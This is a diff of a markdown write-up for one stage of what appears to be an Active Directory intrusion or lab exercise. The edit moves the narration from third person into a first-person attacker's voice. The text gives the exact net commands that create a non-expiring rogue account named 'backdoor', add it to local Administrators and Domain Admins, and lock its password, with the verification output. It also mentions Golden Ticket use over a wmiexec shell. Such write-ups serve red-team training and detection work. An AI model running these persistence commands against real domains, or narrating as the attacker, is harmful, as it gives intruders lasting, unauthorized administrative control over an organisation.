@@ -7,7 +7,7 @@
 
 ## Objective
 
-Establish durable, out-of-band administrative persistence directly on the Active Directory Domain Controller by creating a rogue domain account (`backdoor`) and elevating it into both the local `Administrators` and domain-wide `Domain Admins` security groups.
+Establish durable, independent persistence on the Active Directory Domain Controller by creating a rogue domain user (`backdoor`) and adding it directly to both the local `Administrators` and domain-wide `Domain Admins` groups.
 
 ## Commands
 
@@ -30,21 +30,21 @@ cmd /c "net user backdoor"
 
 ## What happened
 
-Having achieved full administrative execution on the primary Domain Controller (`PC-DC`) using the forged Golden Ticket in Stage 16, the threat actor pivoted toward establishing independent, out-of-band persistence within Active Directory. Relying solely on Kerberos ticket caches leaves an attacker vulnerable to ticket expiration or `krbtgt` password resets. To secure perpetual access, the adversary provisioned a persistent privileged domain identity.
+Even with a Golden Ticket, Kerberos tickets eventually expire or can be wiped if `krbtgt` is rotated twice. To guarantee permanent, independent access, I created an out-of-band administrative account right inside Active Directory:
 
-Operating through the established `wmiexec.py` semi-interactive shell on `PC-DC`, the attacker executed native Windows command-line administrative tools via `cmd.exe /c`. First, the attacker issued `net user backdoor <REDACTED_PASSWORD> /add /expires:never`, provisioning a local and domain identity named `backdoor` with an explicit non-expiring validity flag. 
+1. **Creating the user:** From our active `wmiexec.py` shell on `PC-DC`, I created a new domain user named `backdoor` with a non-expiring flag: `cmd /c "net user backdoor <REDACTED_PASSWORD> /add /expires:never"`.
+2. **Granting local administrator rights:** I added the new account to the machine's local Administrators group: `cmd /c "net localgroup Administrators backdoor /add"`.
+3. **Granting Domain Admin rights:** Next, I promoted the account across the entire Active Directory forest: `net group "Domain Admins" backdoor /add /domain`.
+4. **Locking the password:** I prevented the account from being prompted to change its password: `cmd /c "net user backdoor /passwordchg:no"`.
+5. **Verifying the new admin in Active Directory:** Finally, I inspected the live account properties with `cmd /c "net user backdoor"`:
+   - **Account active:** `Yes`
+   - **Account expires:** `Never`
+   - **Password expires:** `Never`
+   - **Password changeable:** `10/19/2026 5:38:21 AM`
+   - **Local Group Memberships:** `*Administrators`
+   - **Global Group memberships:** `*Domain Admins`, `*Domain Users`
 
-To grant the rogue identity immediate administrative rights over the host, the attacker added the user to the machine's local administrative security pool via `net localgroup Administrators backdoor /add`. Following this, the attacker elevated the account across the entire Active Directory forest by executing `net group "Domain Admins" backdoor /add /domain`. Next, the adversary executed `net user backdoor /passwordchg:no` to harden the account against user-initiated password changes, locking the known credentials in place.
-
-Finally, the attacker ran `cmd /c "net user backdoor"` to inspect the live Active Directory database attributes. The output confirmed:
-- **Account active:** `Yes`
-- **Account expires:** `Never`
-- **Password expires:** `Never`
-- **Password changeable:** `10/19/2026 5:38:21 AM`
-- **Local Group Memberships:** `*Administrators`
-- **Global Group memberships:** `*Domain Admins`, `*Domain Users`
-
-This action represents complete enterprise persistence, allowing the adversary to re-enter the network from any domain endpoint at will using standard Active Directory administrative protocols.
+We now had a permanent, full Domain Admin account that allowed us to log into any domain machine anytime over standard Active Directory administrative protocols.
 
 ## Evidence
 
